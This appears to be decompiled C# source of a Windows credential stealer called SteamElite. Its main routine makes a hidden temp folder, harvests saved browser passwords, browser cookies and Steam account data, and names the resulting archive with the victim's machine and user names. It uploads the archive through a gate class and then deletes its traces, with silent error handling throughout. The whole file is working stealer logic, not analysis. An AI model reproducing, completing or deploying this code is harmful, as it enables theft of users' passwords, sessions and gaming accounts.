// Decompiled with JetBrains decompiler
// Type: SteamElite.Program
// Assembly: SteamElite, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC0AF3C1-BDDB-427F-AF9C-215450AD8173
// Assembly location: C:\Users\Пользователь\Desktop\Decompiled.exe

using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace SteamElite
{
  internal static class Program
  {
    public static string path = Path.GetTempPath() + "elite\\";
    public static string usrid = Program.ReadID(Application.ExecutablePath);

    [STAThread]
    private static string ReadID(byte[] barray)
    {
      byte[] bytes = new byte[12];
      Array.Copy((Array) barray, barray.Length - 12, (Array) bytes, 0, 12);
      return Encoding.UTF8.GetString(bytes).Trim('n');
    }

    private static string ReadID(string pathTofile)
    {
      return Program.ReadID(File.ReadAllBytes(pathTofile));
    }

    public static string Base64Encode(string plainText)
    {
      return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
    }

    private static void Main()
    {
      try
      {
        if (Directory.Exists(Program.path))
          Directory.Delete(Program.path, true);
        Thread.Sleep(1000);
      }
      catch
      {
      }
      Directory.CreateDirectory(Program.path);
      Thread.Sleep(1000);
      try
      {
        GetBrowsersP.GrabPasswrods();
        GetBrowsersC.GrabCoockies();
      }
      catch
      {
      }
      try
      {
        Steam.GSteam();
      }
      catch
      {
      }
      try
      {
        string str = Program.Base64Encode(Program.usrid + "@" + Environment.MachineName + "_" + Environment.UserName + ".zip");
        File.Move(Program.path + "files.zip", Program.path + str);
        new GATE().SendFile(Program.path + str);
        Directory.Delete(Program.path, true);
      }
      catch
      {
      }
    }
  }
}
